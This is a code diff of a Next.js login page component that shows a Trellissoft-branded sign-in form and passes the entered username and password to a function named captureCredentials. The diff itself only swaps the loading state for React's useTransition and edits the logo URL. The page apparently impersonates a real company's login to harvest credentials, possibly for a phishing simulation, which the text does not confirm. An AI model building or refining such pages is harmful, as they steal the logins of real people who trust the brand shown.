@@ -1,6 +1,6 @@
 'use client';
 
-import React, { useState, useEffect, FormEvent } from 'react';
+import React, { useState, useEffect, FormEvent, useTransition } from 'react';
 import Image from 'next/image';
 import { useSearchParams } from 'next/navigation';
 import { ShieldX, AlertTriangle } from 'lucide-react';
@@ -21,8 +21,8 @@ export default function LoginPageClient() {
   const [showSuccessAlert, setShowSuccessAlert] = useState(false);
   const [showErrorAlert, setShowErrorAlert] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
-  const [isLoading, setIsLoading] = useState(false);
   const [fileName, setFileName] = useState('');
+  const [isPending, startTransition] = useTransition();
 
   const searchParams = useSearchParams();
 
@@ -33,36 +33,33 @@ export default function LoginPageClient() {
     }
   }, [searchParams]);
 
-  // Handle Form Submission
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
-    setIsLoading(true);
-    setShowErrorAlert(false);
+    
+    startTransition(async () => {
+      const formData = new FormData();
+      formData.append('username', username);
+      formData.append('password', password);
 
-    const formData = new FormData();
-    formData.append('username', username);
-    formData.append('password', password);
-
-    try {
-      const result = await captureCredentials(null, formData);
-      if (result.success) {
-        setShowSuccessAlert(true);
-      } else {
+      try {
+        const result = await captureCredentials(null, formData);
+        if (result.success) {
+          setShowSuccessAlert(true);
+        } else {
+          setErrorMessage(
+            result.message || 'An unexpected error occurred. Please try again.'
+          );
+          setShowErrorAlert(true);
+        }
+      } catch (error: any) {
+        console.error('Error in handleSubmit:', error);
         setErrorMessage(
-          result.message || 'An unexpected error occurred. Please try again.'
+          error.message ||
+            'There was a problem submitting your request. Please try again later.'
         );
         setShowErrorAlert(true);
       }
-    } catch (error: any) {
-      console.error('Error in handleSubmit:', error);
-      setErrorMessage(
-        error.message ||
-          'There was a problem submitting your request. Please try again later.'
-      );
-      setShowErrorAlert(true);
-    } finally {
-      setIsLoading(false);
-    }
+    });
   };
 
   return (
@@ -146,7 +143,7 @@ export default function LoginPageClient() {
             required
             value={username}
             onChange={(e) => setUsername(e.target.value)}
-            disabled={isLoading}
+            disabled={isPending}
           />
           <input
             type="password"
@@ -155,10 +152,10 @@ export default function LoginPageClient() {
             required
             value={password}
             onChange={(e) => setPassword(e.target.value)}
-            disabled={isLoading}
+            disabled={isPending}
           />
-          <button type="submit" disabled={isLoading}>
-            {isLoading ? 'Signing in...' : 'Sign in'}
+          <button type="submit" disabled={isPending}>
+            {isPending ? 'Signing in...' : 'Sign in'}
           </button>
         </form>
         <div className="footer">
@@ -173,7 +170,7 @@ export default function LoginPageClient() {
           <AlertDialogHeader>
             <div className="flex justify-center mb-4">
               <Image
-                src="https://media.licdn.com/dms/image/D560BAQGj-2L22A-4-Q/company-logo_200_200/0/1712739343993/trellissoft_logo?e=1728518400&v=beta&t=o1n4Gk_1-vJ3s_Yy_J_j_j_j_j_j_j_j_j"
+                src="https://media.licdn.com/dms/image/D560BAQGj-2L22A-4-Q/company-logo_200_200/0/1712739343993/trellissoft_logo?e=1728518400&v=beta&t=o1n4Gk_1-vJ3s_Yy_J_j_j_j_j_j_j_j"
                 alt="Trellissoft Logo"
                 width={180}
                 height={60}
